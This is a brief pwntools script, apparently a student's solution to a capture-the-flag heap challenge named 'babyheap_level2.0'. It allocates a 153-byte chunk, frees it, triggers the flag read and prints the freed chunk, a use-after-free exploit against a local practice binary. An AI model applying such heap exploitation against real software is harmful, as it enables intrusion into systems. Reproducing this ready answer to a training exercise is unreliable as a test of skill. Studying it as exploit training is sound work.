# Nagib Lakhdari 3si2
from pwn import *

# Start the process for the challenge binary
p = process("/challenge/babyheap_level2.0")

# Send commands to the process
p.sendline(b'malloc')      # Allocate memory
p.sendline(b'153')         # Size of the memory allocation
p.sendline(b'free')        # Free the allocated memory
p.sendline(b'read_flag')   # Read the flag
p.sendline(b'puts')        # Print the flag

# Interact with the process to get the output
p.interactive()
